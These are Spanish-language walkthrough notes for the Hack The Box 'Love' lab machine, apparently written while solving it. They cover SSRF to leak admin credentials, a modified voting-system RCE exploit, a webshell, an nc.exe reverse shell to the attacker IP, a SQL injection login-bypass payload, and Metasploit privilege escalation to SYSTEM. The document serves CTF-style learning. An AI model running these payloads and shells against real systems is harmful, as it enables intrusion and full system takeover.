
PORT      STATE SERVICE
80/tcp    open  http
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql

-Entramos al puerto 80 y vemos una web con el Título 'Voting System', en el que vemos un Panel de Login.

-Para ver el Certificado de la web del puerto 443:
	-openssl s_client -connect 10.10.10.239:443
		**OU=love.htb**
		**CN=staging.love.htb**
		(Descubrimos los siguientes subdominio!!)

-visitamos el siguiente subdominio y nos vemos una web para escanear archivos:
	-http://staging.love.htb

-Probamos a hacernos una Petición a nuestro servidor:
	-Specify de File Url: http://10.10.14.18/
			**"GET / HTTP/1.1" 200 -**
			(Recibimos la Petición!!)

-Probamos a ejecutar Archivos PHP pero no nos interpreta el Código

-Probamos un posible SSRF:
	-Specify de File Url: http://127.0.0.1/
		-Nos Sale el Panel de Login de la Página Principal
			**-Existe un SSRF!!**

-NOTA: También funciona con --> http://localhost/

-En el Puerto 5000 , nos decía 'Forbidden', acceso denegado, vamos a intentar listar su contenido a través del SSRF:
	-Specify de File Url: http://localhost:5000
		**Admin Creds admin: @LoveIsInTheAir!!!!**
		(Tenemos la Credenciales de Admin!!)

-Nos vamos a /admin e introducimos la credenciales:
	-User id: admin
	-Password: @LoveIsInTheAir!!!!

-Editamos los siguientes valores del exploit:
	IP = "10.10.14.239" # Website's URL
	USERNAME = "admin" #Auth username
	PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
	REV_IP = "10.10.14.18" # Reverse shell IP
	REV_PORT = "1234" # Reverse port

-Tenemos que cambiar todas estas URLS del exploit, tenemos que **Quitar** en todas **el directorio 'votesystem'**, ya que en nuestra máquina no existe:
	INDEX_PAGE = f"http://{IP}/votesystem/admin/index.php"
	LOGIN_URL = f"http://{IP}/votesystem/admin/login.php"
	VOTE_URL = f"http://{IP}/votesystem/admin/voters_add.php"
	CALL_SHELL = f"http://{IP}/votesystem/images/shell.php"

-Ejecutamos el exploit y obtenemos la RS:
	-python3 exploit.py
		**C:\xampp\htdocs\omrs\images>whoami**
			**love\phoebe**

## Forma manual - Upload Shell.php (Authenticated)

-Una vez autenticados, nos vamos a la sección de:
	-/admin/voters.php

-Le damos a new+ y subimos una webshell.php

-Ejecutamos Comandos a través de la siguiente URL:
	-http://10.10.10.239/images/shell.php?cmd=whoami
		**love\phoebe**

-Nos mandamos una RS:
	-http://10.10.10.239/images/shell.php?cmd=\\10.10.14.18\smb\nc.exe 10.10.14.18 1234 -e cmd
		**C:\xampp\htdocs\omrs\images>** 

### SQLI (Login Bypass) - Unintented Way 

-Buscamos en searchsploit 'voting system', por si fuera un CMS con vulnerabilidades:
	-searchsploit voting system:
		**Voting System 1.0 - Authentication Bypass (SQLI)**
		(Este tiene buena pinta)

-Interceptamos la Petición en el Login y analizamos el exploit

-El exploit nos dice que tenemos que inyectar en siguiente Payload en el Panel de Login:
	login=yea&password=admin&username=dsfgdf' UNION SELECT 1,2,"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -
		-Lo mandamos, le damos a 'Follow Redirect' y estamos dentro
		-Nos Hemos saltado el Login!!

-Una vez nos saltamos el Login, nos lleva a:
	-http://10.10.10.239/Admin/home.php

--------------------------------------------------------------------------

## Escalada de Privilegios

-Creamos un exploit con Msfvenom y nos mandamos la session a Metasploit

-Usamos el siguiente módulo para buscar maneras de Escalar Privilegios:
	-use multi/recon/local_exploit_suggester

-Encontramos el siguiente Módulo que nos puede funcionar:
	-use exploit/windows/local/always_install_elevated
		-set lhost 10.10.14.18
		-set lport 4445
		-set session 1
		-runs
			**meterpreter > getuid**
				**Server username: NT AUTHORITY\SYSTEM**











